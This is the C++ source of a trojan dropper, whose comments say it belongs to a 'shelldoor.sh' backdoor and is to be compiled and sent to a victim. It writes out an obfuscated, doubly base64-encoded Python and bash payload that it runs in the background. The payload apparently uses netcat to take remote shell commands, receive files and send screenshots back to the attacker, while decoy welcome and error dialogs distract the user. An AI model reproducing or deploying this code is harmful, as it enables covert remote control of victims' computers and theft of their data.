// This script makes part of the shelldoor.sh.
// This is the trojan.
// Use this script instead of shelldoor.sh -s; 
// Compile it and send to the victim.
// g++ buildMe.cpp -o <exe_file>
// 
// Mateus-n00b, February 2017
//
// Version 0.1
// License GPLv2
//

#include "iostream"
#include "stdio.h"
#include "stdlib.h"

using namespace std;

main(int argc, const char *argv[]){
    system("echo CmltcG9ydCBvcwppbXBvcnQgYmFzZTY0CgpwYXlsb2FkID0gJycnQ21selgzZHZjbXRwYm1jb0tYc0tJQ0J6YkdWbGNDQTFDaUFnYVdZZ1cxc2dMWG9nSWlSRFRVUWlJRjFkT3lCMGFHVnVDaUFnSUNBZ0lFOU9UMFpHUFNKRldFbFVJZ29nSUdacENpQWdaWGhwZEFwOUNncHpaVzVrWDJGamF5Z3Bld29nSUc1aklDSWtWRUZTUjBWVUlpQXlNakl5SUR3OFBDQW5RVU5MSndwOUNncHpaVzVrWDNKbGNDZ3Bld29nSUNBZ2JtTWdJaVJVUVZKSFJWUWlJRE16TXpNZ1BEdzhJQ0lrS0NSRFRVUXBJZ3A5Q2dwaGMxOWhYM05sY25abGNpZ3Bld29nSUhkb2FXeGxJRnRiSURFZ1hWMDdJR1J2Q2dvZ0lDQWdJQ0JTUlZFOUpDaHVZeUF0YkNBdGNDQXlNakl5S1FvZ0lDQWdJQ0J6Wlc1a1gyRmphd29LSUNBZ0lDQWdhV1lnWjNKbGNDQWlTRWs2SWlBOFBEd2dJaVJTUlZFaUlDWStJQzlrWlhZdmJuVnNiRHNnZEdobGJnb2dJQ0FnSUNBZ0lDQlVRVkpIUlZROUpDaGpkWFFnTFdRbk9pY2dMV1l5SUR3OFBDQWlKRkpGVVNJcENpQWdJQ0FnSUNBZ0l5QWdaV05vYnlBaVd5dGRJRkpsWTJWcGRtVmtJQ1JVUVZKSFJWUWlDZ29nSUNBZ0lDQmxiR2xtSUdkeVpYQWdJbE5JUlV4TUlpQThQRHdnSWlSU1JWRWlJQ1kKK0lDOWtaWFl2Ym5Wc2JEc2dkR2hsYmdvZ0lDQWdJQ0FnSUNBZ2MyVnVaRjloWTJzS0lDQWdJQ0FnSUNBZ0lIZG9hV3hsSUZ0YklDSWtUMDVQUmtZaUlDRTlJQ0pGV0VsVUlpQmRYVHNnWkc4S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNNZ1EyaGxZMnNnYVdZZ2RHaGxJR05zYVdWdWRDQnBjeUJ6Wlc1a2FXNW5JR050WkhNS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdselgzZHZjbXRwYm1jZ0pnb0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lFTk5SRDBrS0c1aklDMXNJQzF3SURJeU1qSXBDZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjMlZ1WkY5aFkyc0tJQ0FnSUNBZ0lDQUpJQ0FnSUNBZ2MyeGxaWEFnTUM0MUNpQWdJQ0FnSUNBZ0NTQWdJQ0FnSUhObGJtUmZjbVZ3SUNZS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUVOTlJEMGlJZ29nSUNBZ0lDQWdJQ0FnWkc5dVpRb0tJQ0FnSUNBZ1pXeHBaaUJuY21Wd0lDSlZVRXc2SWlBOFBEd2dJaVJTUlZFaUlDWQorSUM5a1pYWXZiblZzYkRzZ2RHaGxiZ29nSUNBZ0lDQWdJQ0FnSUNCelpXNWtYMkZqYXdvZ0lDQWdJQ0FnSUNBZ0lDQkdTVXhGUFNRb1kzVjBJQzFrT2lBdFpqSWdQRHc4SUNJa1VrVlJJaWtLSUNBZ0lDQWdJQ0FnSUNBZ2JtTWdMV3dnTFhBZ01qSXlNaUErSUNJa1JrbE1SU0lLSUNBZ0lDQWdJQ0FnSUNBZ2MyVnVaRjloWTJzS0lDQWdJQ0FnWld4cFppQm5jbVZ3SUNKVFNFOVVJaUE4UER3Z0lpUlNSVkVpSUNZCitJQzlrWlhZdmJuVnNiRHNnZEdobGJnb2dJQ0FnSUNBZ0lDQWdjMlZ1WkY5aFkyc0tDaUFnSUNBZ0lDQWdJQ0JwYlhCdmNuUWdMWGRwYm1SdmR5QWdjbTl2ZENBaWFXMW5MbXB3WnlJS0lDQWdJQ0FnSUNBZ0lHZDZhWEFnTFdZZ0ltbHRaeTVxY0djaUNpQWdJQ0FnSUNBZ0lDQnVZeUFpSkZSQlVrZEZWQ0lnTWpJeU1pQThJQ0pwYldjdWFuQm5MbWQ2SWdvZ0lDQWdJQ0FnSUNBZ1kyOXVkR2x1ZFdVS0lDQWdJQ0FnWm1rS0NpQWdaRzl1WlFwOUNncGhjMTloWDNObGNuWmxjZ289JycnCgpmcCA9IG9wZW4oIi52aXJ1cyIsInciKQpmcC53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHBheWxvYWQpKQpmcC5jbG9zZSgpCgpvcy5zeXN0ZW0oImJhc2ggLnZpcnVzICYiKQpvcy5zeXN0ZW0oInplbml0eSAtLXF1ZXN0aW9uIikK | base64 -d > .n00b");

    system("sleep 3;python .n00b &");
    system("zenity --info --title'Olá, seja bem vindo!!!'");
    system("zenity --question;zenity --error --title 'Erro desconhecido!'");

}
